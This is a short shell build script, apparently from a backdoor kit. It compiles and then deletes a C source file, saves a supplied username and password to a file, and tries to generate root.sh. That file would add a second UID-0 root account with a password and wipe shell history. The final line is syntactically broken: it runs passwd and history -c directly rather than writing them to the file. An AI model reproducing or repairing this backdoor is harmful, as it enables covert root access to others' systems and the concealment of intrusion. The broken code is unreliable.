#Build:
#USAGE - sh build.sh <ROOTING USER> <ROOTING PASS> <SERVER IP>

gcc main.c -o main
rm -rf main.c

echo $1 >> details.txt
echo $2 >> details.txt

echo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash $1; echo -e $2"\n"$2 | passwd $1; history -c; >> root.sh
